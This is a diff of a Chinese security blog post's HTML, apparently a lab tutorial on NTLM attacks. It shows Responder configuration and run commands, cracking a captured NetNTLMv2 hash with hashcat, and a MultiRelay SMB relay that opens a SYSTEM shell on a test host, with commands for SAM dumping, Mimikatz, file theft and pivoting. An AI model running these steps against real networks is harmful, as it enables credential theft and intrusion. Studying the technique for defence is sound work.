-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/hashcat/hashcat.git
-</span></span><span style="display:flex;"><span>$ mkdir -p hashcat/deps
-</span></span><span style="display:flex;"><span>$ git clone https://github.com/KhronosGroup/OpenCL-Headers.git hashcat/deps/OpenCL
-</span></span><span style="display:flex;"><span>$ cd hashcat
-</span></span><span style="display:flex;"><span>$ make
-</span></span><span style="display:flex;"><span>$ ./example0.sh
-</span></span><span style="display:flex;"><span>$ ./hashcat
-</span></span></code></pre></div><ul>
-<li>利用hashcat暴力猜解密码<br>
--m：hash-type，5600对应NetNTLMv2
-<img src="/img/post/20180912-232838.png" alt="80">
+</code></pre><ul><li>配置(开启 http 和 https)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>➜  Responder git:<span style=color:#f92672>(</span>master<span style=color:#f92672>)</span> ✗ head -n <span style=color:#ae81ff>16</span> Responder.conf
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Responder Core<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>; Servers to start
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>SMB <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>RDP <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>Kerberos <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>FTP <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>POP <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>SMTP <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>IMAP <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>HTTP <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>HTTPS <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>DNS <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>LDAP <span style=color:#f92672>=</span> Off
+</span></span></code></pre></div><ul><li>攻击机执行：$ sudo python Responder.py -I eth0 -v -w on -F on
+<img src=/img/post/Xnip2020-12-11_14-28-15.png alt=90></li></ul><h3 id=0x05-使用hashcat解密>0x05 使用hashcat解密</h3><ul><li>安装hashcat(参考<a href=https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank>这里</a>)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ git clone https://github.com/hashcat/hashcat.git
+</span></span><span style=display:flex><span>$ mkdir -p hashcat/deps
+</span></span><span style=display:flex><span>$ git clone https://github.com/KhronosGroup/OpenCL-Headers.git hashcat/deps/OpenCL
+</span></span><span style=display:flex><span>$ cd hashcat
+</span></span><span style=display:flex><span>$ make
+</span></span><span style=display:flex><span>$ ./example0.sh
+</span></span><span style=display:flex><span>$ ./hashcat
+</span></span></code></pre></div><ul><li>利用hashcat暴力猜解密码<br>-m：hash-type，5600对应NetNTLMv2
+<img src=/img/post/20180912-232838.png alt=80>
 得到密码为123456
-<img src="/img/post/20180912-233101.png" alt="80"></li>
-</ul>
-<h3 id="0x06-利用-responder-的-multirelay-进行中继攻击鸡肋">0x06 利用 Responder 的 MultiRelay 进行中继攻击(鸡肋)</h3>
-<p>NTLM 中继攻击：将高权限主机的 NET-NTLM hash 转发给低权限主机(只能 Relay 未开启 SMB 签名的主机)</p>
-<p>比如 Relay 域控的 NET-NTLM hash 到域内主机，从而获取域内主机的权限</p>
-<ul>
-<li>
-<p>首先查找未开启 SMB 签名的主机
-<img src="/img/post/Xnip2020-12-11_15-23-09.png" alt="70"></p>
-</li>
-<li>
-<p>修改 Responder.conf，关闭 SMB 和 HTTP，然后启动 Responder</p>
-</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  Responder git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗ head -n <span style="color:#ae81ff">16</span> Responder.conf
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Responder Core<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>; Servers to start
-</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>SMB <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>Kerberos <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>FTP <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>POP <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>SMTP <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>IMAP <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>HTTP <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>HTTPS <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>DNS <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>LDAP <span style="color:#f92672">=</span> On
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  Responder git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗ sudo python Responder.py -I eth0 -v
-</span></span></code></pre></div><ul>
-<li>利用 Responder 的 MultiRelay 模块获取 shell</li>
-</ul>
-<p>运行 MultiRelay 后，高权限主机随便执行 net use 即可，比如执行 net use \\aaa</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">➜  tools git:(master) ✗ sudo python MultiRelay.py -t 10.11.11.7 -u ALL</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Responder MultiRelay 2.0 NTLMv1/2 Relay</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Send bugs/hugs/comments to: laurent.gaffie@gmail.com</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Usernames to relay (-u) are case sensitive.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">To kill this script hit CTRL-C.</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">/*</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Use this script in combination with Responder.py for best results.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Make sure to set SMB and HTTP to OFF in Responder.conf.</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">This tool listen on TCP port 80, 3128 and 445.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">For optimal pwnage, launch Responder only with these 2 options:</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">-rv</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Avoid running a command that will likely prompt for information like net use, etc.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">If you do so, use taskkill (as system) to kill the process.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">*/</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Relaying credentials for these users:</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[&#39;ALL&#39;]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Retrieving information for 10.11.11.7...</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SMB signing: False</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Os version: &#39;Windows 7 Professional 7601 Service Pack 1&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Hostname: &#39;WIN7&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Part of the &#39;TEST&#39; domain</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[+] Setting up SMB relay with SMB challenge: fb5db119d38f2d0d</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[+] Received NTLMv2 hash from: 10.11.11.5</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[+] Client info: [&#39;Windows Server 2008 R2 Enterprise 7600&#39;, domain: &#39;TEST&#39;, signing:&#39;True&#39;]</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[+] Username: Administrator is whitelisted, forwarding credentials.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[+] SMB Session Auth sent.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[+] Looks good, Administrator has admin rights on C$.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[+] Authenticated.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[+] Dropping into Responder&#39;s interactive shell, type &#34;exit&#34; to terminate</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Available commands:</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dump               -&gt; Extract the SAM database and print hashes.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">regdump KEY        -&gt; Dump an HKLM registry key (eg: regdump SYSTEM)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read Path_To_File  -&gt; Read a file (eg: read /windows/win.ini)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">get  Path_To_File  -&gt; Download a file (eg: get users/administrator/desktop/password.txt)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">delete Path_To_File-&gt; Delete a file (eg: delete /windows/temp/executable.exe)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">upload Path_To_File-&gt; Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">runas  Command     -&gt; Run a command as the currently logged in user. (eg: runas whoami)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">scan /24           -&gt; Scan (Using SMB) this /24 or /16 to find hosts to pivot to</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pivot  IP address  -&gt; Connect to another host (eg: pivot 10.0.0.12)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mimi  command      -&gt; Run a remote Mimikatz 64 bits command (eg: mimi coffee)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mimi32  command    -&gt; Run a remote Mimikatz 32 bits command (eg: mimi coffee)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lcmd  command      -&gt; Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">help               -&gt; Print this message.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exit               -&gt; Exit this shell and return in relay mode.</span>
-</span></span><span style="display:flex;"><span>                      <span style="color:#a6e22e">If you want to quit type exit and then use CTRL-C</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Any other command than that will be run as SYSTEM on the target.</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connected to 10.11.11.7 as LocalSystem.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">C:\Windows\system32\:#whoami</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nt authority\system</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">C:\Windows\system32\:#</span>
-</span></span></code></pre></div><h4 id="reference侵删">Reference(侵删)：</h4>
-<ul>
-<li><a href="https://apt404.github.io/2016/08/11/ntlm-kerberos?_blank">https://apt404.github.io/2016/08/11/ntlm-kerberos</a></li>
-<li><a href="http://www.4hou.com/system/9383.html?_blank">http://www.4hou.com/system/9383.html</a></li>
-<li><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/?_blank">https://3gstudent.github.io/Windows下的密码NTLM-hash和Net-NTLM-hash介绍</a></li>
-<li><a href="https://gist.github.com/anonymous/70f792d50078f0ee795d39d0aa0da46e?_blank">https://gist.github.com/anonymous/70f792d50078f0ee795d39d0aa0da46e</a></li>
-<li><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes?_blank">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes</a></li>
-<li><a href="https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745?_blank">https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745</a></li>
-<li><a href="https://www.anquanke.com/post/id/85004?_blank">https://www.anquanke.com/post/id/85004</a></li>
-<li><a href="https://www.anquanke.com/post/id/193493">https://www.anquanke.com/post/id/193493</a></li>
-<li><a href="https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank">https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going</a></li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<img src=/img/post/20180912-233101.png alt=80></li></ul><h3 id=0x06-利用-responder-的-multirelay-进行中继攻击鸡肋>0x06 利用 Responder 的 MultiRelay 进行中继攻击(鸡肋)</h3><p>NTLM 中继攻击：将高权限主机的 NET-NTLM hash 转发给低权限主机(只能 Relay 未开启 SMB 签名的主机)</p><p>比如 Relay 域控的 NET-NTLM hash 到域内主机，从而获取域内主机的权限</p><ul><li><p>首先查找未开启 SMB 签名的主机
+<img src=/img/post/Xnip2020-12-11_15-23-09.png alt=70></p></li><li><p>修改 Responder.conf，关闭 SMB 和 HTTP，然后启动 Responder</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>➜  Responder git:<span style=color:#f92672>(</span>master<span style=color:#f92672>)</span> ✗ head -n <span style=color:#ae81ff>16</span> Responder.conf
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Responder Core<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>; Servers to start
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>SMB <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>Kerberos <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>FTP <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>POP <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>SMTP <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>IMAP <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>HTTP <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>HTTPS <span style=color:#f92672>=</span> Off
+</span></span><span style=display:flex><span>DNS <span style=color:#f92672>=</span> On
+</span></span><span style=display:flex><span>LDAP <span style=color:#f92672>=</span> On
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>➜  Responder git:<span style=color:#f92672>(</span>master<span style=color:#f92672>)</span> ✗ sudo python Responder.py -I eth0 -v
+</span></span></code></pre></div><ul><li>利用 Responder 的 MultiRelay 模块获取 shell</li></ul><p>运行 MultiRelay 后，高权限主机随便执行 net use 即可，比如执行 net use \\aaa</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#a6e22e>➜  tools git:(master) ✗ sudo python MultiRelay.py -t 10.11.11.7 -u ALL</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Responder MultiRelay 2.0 NTLMv1/2 Relay</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Send bugs/hugs/comments to: laurent.gaffie@gmail.com</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Usernames to relay (-u) are case sensitive.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>To kill this script hit CTRL-C.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>/*</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Use this script in combination with Responder.py for best results.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Make sure to set SMB and HTTP to OFF in Responder.conf.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>This tool listen on TCP port 80, 3128 and 445.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>For optimal pwnage, launch Responder only with these 2 options:</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>-rv</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Avoid running a command that will likely prompt for information like net use, etc.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>If you do so, use taskkill (as system) to kill the process.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Relaying credentials for these users:</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[&#39;ALL&#39;]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Retrieving information for 10.11.11.7...</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>SMB signing: False</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Os version: &#39;Windows 7 Professional 7601 Service Pack 1&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Hostname: &#39;WIN7&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Part of the &#39;TEST&#39; domain</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>[+] Setting up SMB relay with SMB challenge: fb5db119d38f2d0d</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>[+] Received NTLMv2 hash from: 10.11.11.5</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>[+] Client info: [&#39;Windows Server 2008 R2 Enterprise 7600&#39;, domain: &#39;TEST&#39;, signing:&#39;True&#39;]</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>[+] Username: Administrator is whitelisted, forwarding credentials.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>[+] SMB Session Auth sent.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>[+] Looks good, Administrator has admin rights on C$.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>[+] Authenticated.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>[+] Dropping into Responder&#39;s interactive shell, type &#34;exit&#34; to terminate</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Available commands:</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>dump               -&gt; Extract the SAM database and print hashes.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>regdump KEY        -&gt; Dump an HKLM registry key (eg: regdump SYSTEM)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read Path_To_File  -&gt; Read a file (eg: read /windows/win.ini)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>get  Path_To_File  -&gt; Download a file (eg: get users/administrator/desktop/password.txt)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>delete Path_To_File-&gt; Delete a file (eg: delete /windows/temp/executable.exe)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>upload Path_To_File-&gt; Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>runas  Command     -&gt; Run a command as the currently logged in user. (eg: runas whoami)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>scan /24           -&gt; Scan (Using SMB) this /24 or /16 to find hosts to pivot to</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>pivot  IP address  -&gt; Connect to another host (eg: pivot 10.0.0.12)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mimi  command      -&gt; Run a remote Mimikatz 64 bits command (eg: mimi coffee)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mimi32  command    -&gt; Run a remote Mimikatz 32 bits command (eg: mimi coffee)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>lcmd  command      -&gt; Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>help               -&gt; Print this message.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>exit               -&gt; Exit this shell and return in relay mode.</span>
+</span></span><span style=display:flex><span>                      <span style=color:#a6e22e>If you want to quit type exit and then use CTRL-C</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Any other command than that will be run as SYSTEM on the target.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Connected to 10.11.11.7 as LocalSystem.</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>C:\Windows\system32\:#whoami</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>nt authority\system</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>C:\Windows\system32\:#</span>
+</span></span></code></pre></div><h4 id=reference侵删>Reference(侵删)：</h4><ul><li><a href=https://apt404.github.io/2016/08/11/ntlm-kerberos?_blank>https://apt404.github.io/2016/08/11/ntlm-kerberos</a></li><li><a href=http://www.4hou.com/system/9383.html?_blank>http://www.4hou.com/system/9383.html</a></li><li><a href=https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/?_blank>https://3gstudent.github.io/Windows下的密码NTLM-hash和Net-NTLM-hash介绍</a></li><li><a href=https://gist.github.com/anonymous/70f792d50078f0ee795d39d0aa0da46e?_blank>https://gist.github.com/anonymous/70f792d50078f0ee795d39d0aa0da46e</a></li><li><a href=https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes?_blank>https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes</a></li><li><a href=https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745?_blank>https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745</a></li><li><a href=https://www.anquanke.com/post/id/85004?_blank>https://www.anquanke.com/post/id/85004</a></li><li><a href=https://www.anquanke.com/post/id/193493>https://www.anquanke.com/post/id/193493</a></li><li><a href=https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank>https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going</a></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
